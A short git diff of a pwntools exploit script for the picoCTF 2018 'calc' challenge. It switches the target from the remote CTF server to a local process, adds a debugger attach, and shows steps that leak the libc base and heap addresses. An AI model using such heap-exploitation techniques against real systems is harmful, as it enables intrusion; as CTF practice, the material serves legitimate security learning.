@@ -2,8 +2,8 @@ from pwn import *
 
 e = ELF("./calc")
 libc = ELF("./libc.so.6")
-#p = process(e.path, env={"LD_PRELOAD": libc.path})
-p = remote("2018shell.picoctf.com", 54291)
+p = process(e.path, env={"LD_PRELOAD": libc.path})
+#p = remote("2018shell.picoctf.com", 54291)
 
 def alloc(p, name="", padding=0, size=0x70, ops=0):
   p.clean()
@@ -48,7 +48,7 @@ p.recvuntil("Running ")
 leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
 libc_base = leak - libc.symbols["free"]
 print("Libc Base: {0:#x}".format(libc_base))
-
+gdb.attach(p)
 p.recvuntil("Running ")
 heap_leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
 print("Heap Leak: {0:#x}".format(heap_leak))
